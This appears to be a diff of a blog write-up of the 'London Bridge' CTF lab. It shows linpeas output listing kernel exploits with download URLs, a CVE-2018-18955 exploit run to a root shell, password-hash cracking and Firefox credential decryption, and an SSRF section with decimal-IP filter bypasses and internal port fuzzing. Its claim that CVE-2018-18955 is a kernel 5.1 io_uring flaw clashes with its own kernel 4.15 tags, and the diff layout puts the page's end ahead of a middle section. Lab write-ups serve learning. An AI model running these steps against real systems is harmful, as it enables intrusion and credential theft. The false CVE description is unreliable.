-</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>18.04 <span class=o>]{</span>kernel:4.15.0-20-generic<span class=o>}</span>,fedora<span class=o>=</span>28<span class=o>{</span>kernel:4.16.3-301.fc28<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
-</span></span><span class=line><span class=cl>   Comments: CONFIG_USER_NS needs to be enabled
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2022-32250<span class=o>]</span> nft_object UAF <span class=o>(</span>NFT_MSG_NEWSET<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
-</span></span><span class=line><span class=cl>https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>ubuntu</span><span class=o>=(</span>22.04<span class=o>){</span>kernel:5.15.0-27-generic<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
-</span></span><span class=line><span class=cl>   Comments: kernel.unprivileged_userns_clone<span class=o>=</span><span class=m>1</span> required <span class=o>(</span>to obtain CAP_NET_ADMIN<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2022-2586<span class=o>]</span> nft_object UAF
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>ubuntu</span><span class=o>=(</span>20.04<span class=o>){</span>kernel:5.12.13<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
-</span></span><span class=line><span class=cl>   Comments: kernel.unprivileged_userns_clone<span class=o>=</span><span class=m>1</span> required <span class=o>(</span>to obtain CAP_NET_ADMIN<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-22555<span class=o>]</span> Netfilter heap out-of-bounds write
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>ubuntu</span><span class=o>=</span>20.04<span class=o>{</span>kernel:5.8.0-*<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
-</span></span><span class=line><span class=cl>   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
-</span></span><span class=line><span class=cl>   Comments: ip_tables kernel module must be loaded
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2019-18634<span class=o>]</span> sudo pwfeedback
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>mint</span><span class=o>=</span><span class=m>19</span>
-</span></span><span class=line><span class=cl>   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
-</span></span><span class=line><span class=cl>   Comments: sudo configuration requires pwfeedback to be enabled.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2019-15666<span class=o>]</span> XFRM_UAF
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Download URL: 
-</span></span><span class=line><span class=cl>   Comments: CONFIG_USER_NS needs to be enabled<span class=p>;</span> CONFIG_XFRM needs to be enabled
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2017-0358<span class=o>]</span> ntfs-3g-modprobe
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class=o>=</span><span class=m>1072</span>
-</span></span><span class=line><span class=cl>   Exposure: less probable
-</span></span><span class=line><span class=cl>   Tags: <span class=nv>ubuntu</span><span class=o>=</span>16.04<span class=o>{</span>ntfs-3g:2015.3.14AR.1-1build1<span class=o>}</span>,debian<span class=o>=</span>7.0<span class=o>{</span>ntfs-3g:2012.1.15AR.5-2.1+deb7u2<span class=o>}</span>,debian<span class=o>=</span>8.0<span class=o>{</span>ntfs-3g:2014.2.15AR.2-1+deb8u2<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
-</span></span><span class=line><span class=cl>   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>                ╔════════════════════════════════════════════════╗
-</span></span><span class=line><span class=cl>════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                            
-</span></span><span class=line><span class=cl>                ╚════════════════════════════════════════════════╝                                                                                            
-</span></span><span class=line><span class=cl>╔══════════╣ Running processes <span class=o>(</span>cleaned<span class=o>)</span>
-</span></span><span class=line><span class=cl>╚ Check weird <span class=p>&amp;</span> unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes 
-</span></span><span class=line><span class=cl>systemd+   <span class=m>240</span>  0.0  0.2  <span class=m>80088</span>  <span class=m>5304</span> ?        Ss   08:37   0:00 /lib/systemd/systemd-networkd
-</span></span><span class=line><span class=cl>  └─<span class=o>(</span>Caps<span class=o>)</span> <span class=nv>0x0000000000003c00</span><span class=o>=</span>cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Processes with credentials in memory <span class=o>(</span>root req<span class=o>)</span>
-</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory    
-</span></span><span class=line><span class=cl>sshd: process found <span class=o>(</span>dump creds from memory as root<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Analyzing .service files
-</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                   
-</span></span><span class=line><span class=cl>/etc/systemd/system/app.service is calling this writable executable: /home/beth/                                                                              
-</span></span><span class=line><span class=cl>/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Analyzing Rsync Files <span class=o>(</span>limit 70<span class=o>)</span>
-</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>1044</span> Feb <span class=m>13</span>  <span class=m>2020</span> /usr/share/doc/rsync/examples/rsyncd.conf
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Analyzing PGP-GPG Files <span class=o>(</span>limit 70<span class=o>)</span>
-</span></span><span class=line><span class=cl>/usr/bin/gpg
-</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> beth beth <span class=m>1200</span> Oct  <span class=m>1</span> 10:53 /home/beth/.gnupg/trustdb.gpg
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>╔══════════╣ Searching uncommon passwd files <span class=o>(</span>splunk<span class=o>)</span>
-</span></span><span class=line><span class=cl>passwd file: /etc/pam.d/passwd
-</span></span><span class=line><span class=cl>passwd file: /etc/passwd
-</span></span><span class=line><span class=cl>passwd file: /usr/share/bash-completion/completions/passwd
-</span></span><span class=line><span class=cl>passwd file: /usr/share/lintian/overrides/passwd
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>══╣ Some home ssh config file was found
-</span></span><span class=line><span class=cl>/usr/share/openssh/sshd_config
-</span></span></code></pre></div><p>All the above were interesting privilege escalation vectors by using linpeas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╔══════════╣ Analyzing .service files
-</span></span><span class=line><span class=cl>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                   
-</span></span><span class=line><span class=cl>/etc/systemd/system/app.service is calling this writable executable: /home/beth/                                                                              
-</span></span><span class=line><span class=cl>/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
-</span></span></code></pre></div><p>I have started with the services, where the executable <code>(/home/beth/.local/bin/gunicorn)</code> which it&rsquo;s calling is writable. But we have a problem in it, the service is controlled (start/stop/restart) by root user. We need to wait for starting/restarting action of that service, in this case it is not possible.</p><p>Lets move on to next.</p><h3 id=cve-2018-18955>CVE-2018-18955</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2018-18955<span class=o>]</span> subuid_shell
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class=o>=</span><span class=m>1712</span>
-</span></span><span class=line><span class=cl>   Exposure: probable
-</span></span><span class=line><span class=cl>   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>18.04 <span class=o>]{</span>kernel:4.15.0-20-generic<span class=o>}</span>,fedora<span class=o>=</span>28<span class=o>{</span>kernel:4.16.3-301.fc28<span class=o>}</span>
-</span></span><span class=line><span class=cl>   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
-</span></span><span class=line><span class=cl>   Comments: CONFIG_USER_NS needs to be enabled
-</span></span></code></pre></div><p>I&rsquo;ve tried exploiting other cvulnerabilities, but <code>CVE-2018-18955</code> worked for me. Lets use <a href=https://github.com/scheatkode/CVE-2018-18955 target=_blank rel=noopener>CVE-2018-18955</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>beth@london:~/tmp$ ./exploit.dbus.sh 
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Compiling...
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> starting
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> setting up namespace
-</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> <span class=k>done</span>, namespace sandbox <span class=nb>set</span> up
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> mapping subordinate ids
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> subuid: <span class=m>100000</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> subgid: <span class=m>100000</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> <span class=k>done</span>, mapped subordinate ids
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> executing subshell
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> starting
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> setting up namespace
-</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> <span class=k>done</span>, namespace sandbox <span class=nb>set</span> up
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> mapping subordinate ids
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> subuid: <span class=m>100000</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> subgid: <span class=m>100000</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> <span class=k>done</span>, mapped subordinate ids
-</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> executing subshell
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Launching dbus service...
-</span></span><span class=line><span class=cl>Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Success:
-</span></span><span class=line><span class=cl>-rwsrwxr-x <span class=m>1</span> root root <span class=m>8392</span> Oct  <span class=m>1</span> 22:58 /tmp/sh
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up...
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Launching root shell: /tmp/sh
-</span></span><span class=line><span class=cl>root@london:~/tmp# 
-</span></span></code></pre></div><p><code>CVE-2018-18955</code> is a high-severity vulnerability in the <code>Linux kernel's io_uring subsystem</code>, introduced in version 5.1, that allows local users to <code>escalate their privileges due</code> to <code>improper validation of data structures</code>. This memory corruption flaw can be exploited through crafted I/O requests, enabling attackers to execute arbitrary code with kernel-level privileges.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@london:/root# cat /root/.root.txt
-</span></span><span class=line><span class=cl>THM<span class=o>{</span>REDACTED<span class=o>}</span>
-</span></span></code></pre></div><p>We got our second flag here.</p><h2 id=finding-charles-password>Finding Charles Password</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john unshadow.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt                                                                                            
-</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
-</span></span><span class=line><span class=cl>Loaded <span class=m>3</span> password hashes with <span class=m>3</span> different salts <span class=o>(</span>sha512crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$6</span>$ <span class=o>[</span>SHA512 256/256 AVX2 4x<span class=o>])</span>
-</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>5000</span> <span class=k>for</span> all loaded hashes
-</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
-</span></span><span class=line><span class=cl>longlivethequeen <span class=o>(</span>beth<span class=o>)</span>     
-</span></span><span class=line><span class=cl>1g 0:01:49:52 DONE 0.000151g/s 2175p/s 5276c/s 5276C/s !!!playboy!!!7..*7¡Vamos!                                                          
-</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                                                                     
-</span></span><span class=line><span class=cl>Session completed.
-</span></span></code></pre></div><p>As a root user I have access to bot <code>/etc/passwd</code> and <code>/etc/shadow</code> file. So I tried to crack the password using john by unshadowed hash. But at the end I&rsquo;m able to find the password of user <code>beth</code>.</p><h3 id=firefox_decrypt>firefox_decrypt</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@london:/home/charles# ls -lah
-</span></span><span class=line><span class=cl>total 24K
-</span></span><span class=line><span class=cl>drw------- <span class=m>3</span> charles charles 4.0K Apr <span class=m>23</span> 22:11 .
-</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root    root    4.0K Mar <span class=m>10</span>  <span class=m>2024</span> ..
-</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root    root       <span class=m>9</span> Apr <span class=m>23</span> 22:11 .bash_history -&gt; /dev/null
-</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> charles charles  <span class=m>220</span> Mar <span class=m>10</span>  <span class=m>2024</span> .bash_logout
-</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> charles charles 3.7K Mar <span class=m>10</span>  <span class=m>2024</span> .bashrc
-</span></span><span class=line><span class=cl>drw------- <span class=m>3</span> charles charles 4.0K Mar <span class=m>16</span>  <span class=m>2024</span> .mozilla
-</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> charles charles  <span class=m>807</span> Mar <span class=m>10</span>  <span class=m>2024</span> .profile
-</span></span></code></pre></div><p>When looking into home directory of user charles, found an interesting file <code>.mozilla</code>, where we can find all saved passwords for websites. If we are lucky, the user may used the same passwords in multile places.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget -r -np -nH --cut-dirs<span class=o>=</span><span class=m>1</span> http://londonbridge.thm:8000/firefox/
-</span></span></code></pre></div><p>Transfered all contents of <code>.mozilla</code> using python server to the local system for further investigation.</p><p>While searching in the internet got an interesting page: <a href=https://github.com/unode/firefox_decrypt target=_blank rel=noopener>unode|firefox_decrypt</a>
-. Lets use this github page for decrypting firefox credentials.0</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python firefox_decrypt.py ../firefox/8k3bf3zp.charles/
-</span></span><span class=line><span class=cl>2024-10-02 20:05:56,800 - WARNING - profile.ini not found in ../firefox/8k3bf3zp.charles/
-</span></span><span class=line><span class=cl>2024-10-02 20:05:56,800 - WARNING - Continuing and assuming <span class=s1>&#39;../firefox/8k3bf3zp.charles/&#39;</span> is a profile location
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Website:   https://www.buckinghampalace.com
-</span></span><span class=line><span class=cl>Username: <span class=s1>&#39;Charles&#39;</span>
-</span></span><span class=line><span class=cl>Password: <span class=s1>&#39;REDACTED&#39;</span>
-</span></span></code></pre></div><p>By using the above it hub exploit we are able to succesfully extract the password of the user charles.</p><p>We got our final flag here.</p><h2 id=conclusion>Conclusion</h2><p>In conclusion, the <code>The London Bridge</code> CTF challenge provided a comprehensive exploration of various penetration testing techniques, from initial foothold acquisition through Rustscan and ffuf to privilege escalation via linpeas and exploitation of vulnerabilities. The successful extraction of sensitive information, including SSH keys and user credentials, demonstrates the critical importance of robust security measures against SSRF vulnerabilities and misconfigured services. Overall, this writeup illustrates effective strategies for identifying and exploiting weaknesses in a controlled environment, emphasizing the need for continuous learning and adaptation in the ever-evolving field of cybersecurity.</p><p>Happy Hacking !!! &#x1f60e;</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
-<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
-</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>
+</code></pre>
+<p>From the above hint we need to try fuzzing for another parameter. The parameter which we already have is <code>image_url</code>. We need to find the parameter which is missed in development phase.</p>
+<h3 id="ssrf">SSRF</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;FUZZ=http://</span><span class="nv">$attacker_ip</span><span class="s2">/Exif.png&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w /usr/share/wordlists/dirb/big.txt -fs <span class="m">823</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">www                     <span class="o">[</span>Status: 200, Size: 194199, Words: 424, Lines: 357, Duration: 2264ms<span class="o">]</span>
+</span></span></code></pre></div><p>When using <code>ffuf</code> to fuzz the paramater we got the result <code>www</code>. Lets test the parameter www.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST  http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;www=http://127.0.0.1&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;403 Forbidden&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;Forbidden&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;p&gt;You don<span class="p">&amp;</span><span class="c1">#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;</span>
+</span></span></code></pre></div><p>When trying to access localhost, we encountered the error <code>You don’t have permission to access the requested resource</code>. This means that we simply do not have the necessary permissions. If our access were upgraded, we could access the resources on localhost. Additionally, we discovered an <code>SSRF</code> vulnerability.</p>
+<p>Lets try to bypass the access issue or input filter using <a href="https://portswigger.net/web-security/ssrf#ssrf-with-blacklist-based-input-filters" target="_blank" rel="noopener">SSRF with blacklist-based input filters</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl -X POST http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;www=http://2130706433&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>                  
+</span></span><span class="line"><span class="cl">&lt;HTML&gt;
+</span></span><span class="line"><span class="cl">&lt;body <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">&#34;gray&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;London brigde&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">height</span><span class="o">=</span>400px <span class="nv">width</span><span class="o">=</span>600px <span class="nv">src</span> <span class="o">=</span><span class="s2">&#34;static/1.webp&#34;</span>&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;font <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;monotype corsiva&#34;</span> <span class="nv">size</span><span class="o">=</span>18&gt;London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Falling down, falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Build it up with iron bars&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Iron bars, iron bars&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Build it up with iron bars&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Iron bars will bend and break&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Bend and break, bend and break&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Iron bars will bend and break&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">height</span><span class="o">=</span>400px <span class="nv">width</span><span class="o">=</span>600px <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;static/2.webp&#34;</span>&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;font <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;monotype corsiva&#34;</span> <span class="nv">size</span><span class="o">=</span>18&gt;Build it up with gold and silver&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Gold and silver, gold and silver&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Build it up with gold and silver&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Gold and silver we<span class="s1">&#39;ve not got&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    We&#39;</span>ve not got, we<span class="s1">&#39;ve not got&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Gold and silver we&#39;</span>ve not got&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;img <span class="nv">height</span><span class="o">=</span>400px <span class="nv">width</span><span class="o">=</span>600px <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;static/3.jpg&#34;</span>&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Falling down, falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair lady&lt;br&gt;
+</span></span><span class="line"><span class="cl">    London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    Falling down, falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    London Bridge is falling down&lt;br&gt;
+</span></span><span class="line"><span class="cl">    My fair beth&lt;/font&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/HTML&gt;
+</span></span></code></pre></div><p>We got a positive response from the server. Lets try to check the <code>ports opened in localhost</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;www=http://2130706433:FUZZ&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w 65536_ports.txt -fc <span class="m">500</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl"><span class="m">80</span>                      <span class="o">[</span>Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 171ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">8080</span>                    <span class="o">[</span>Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 276ms<span class="o">]</span>
